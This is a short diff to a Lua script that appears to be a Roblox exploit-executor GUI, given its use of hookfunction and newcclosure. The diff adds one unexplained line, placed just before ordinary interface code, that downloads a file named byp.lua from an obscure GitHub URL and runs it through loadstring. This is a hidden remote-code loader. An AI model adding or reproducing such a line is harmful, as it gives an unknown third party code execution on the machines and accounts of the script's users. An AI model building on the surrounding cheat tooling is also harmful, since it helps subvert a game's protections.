@@ -12,6 +12,8 @@ if hookfunction and newcclosure then
     end))
 end
 
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/lolnoobsloadstring/a78eft78v638qb476ba78w/refs/heads/main/loader/78637bcawubsg76c73/byp.lua"))()
+
 local CommandsList = Instance.new("ScreenGui")
 local InnerFrame = Instance.new("CanvasGroup")
 local UICorner = Instance.new("UICorner")
